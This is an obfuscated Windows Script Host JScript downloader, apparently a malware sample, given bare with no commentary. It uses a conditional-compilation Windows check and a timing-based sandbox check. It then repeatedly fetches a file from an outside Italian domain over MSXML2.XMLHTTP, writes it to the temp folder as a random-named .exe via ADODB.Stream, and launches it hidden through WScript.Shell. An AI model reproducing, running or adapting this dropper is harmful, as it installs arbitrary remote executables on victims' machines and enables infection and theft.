var r = false;
var Bm = "CreateObject";
var j = function w() {return WScript[Bm]("WScript.Shell");}(), ox = 11;
var K = "MSXML2.XMLHTTP";
var Vb = 2123213;
var y = 0;
function R(M0){j["Run"](M0, y, y);};
function X(){return "" + K;};
function E(FT, a){y = y * 1; return FT - a;};
function X0(){return Bm;};
/*@cc_on
  @if (@_win32 || @_win64)
    r = true;
  @end
@*/
if (r)
{
var W = "";
function Jq(){return 22;};
var dZ = 0; var F0 = 0;
function hw()
{
var hj = new this["Date"]();
var RZ = hj["getUTCMilliseconds"]();
WScript["Sleep"](Jq());
var hj = new this["Date"]();
var La = hj["getUTCMilliseconds"]();
WScript["Sleep"](Jq());
var hj = new this["Date"]();
var V = hj["getUTCMilliseconds"]();
var dZ = "I";
dZ = E(La, RZ);
var F0 = "gQ";
F0 = E(V, La);
W = "open";
return E(dZ, F0);
}
var W0 = false;
var T = false;
for (var RE = y; RE < Jq() * 1; RE++){if (hw() != y){
W0 = true; 
F0 = "31" + 11 * dZ + F0; 
T = true; 
break;
}}
function k() {return ((W0 == true) && (W0 == T)) ? 1 : y;};
if (W0 && k() && T){
function M() {return j["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "41aidKFEgx4YonA.exe";};
 dU = X();
 lQ = WScript[Bm](dU);
 var vu = 1;
 while (vu){
try {
lQ[W]("GET", "http://pasticceriabonci.it/m1psa", false);
lQ["send"]();
KV = "Sleep";
for (;;){WScript[KV](Jq() * 11); if (lQ["readystate"] >= 2 * 2) break;};
vu = y;
} catch(Xm){};
}
function Js(sy) {var sU = (1, 2, 3, 4, 5, sy); return sU;};
QT = WScript[X0()]("ADODB.Stream");
dU = QT;
dU[W]();
dU["type"] = Js(1);
dU["write"](lQ["ResponseBody"]);
QT["position"] = Js(y);
dU["Save" + "ToFile"](M(), 2);
QT["c"+"lose"]();
F = M();
R(F);
}
}

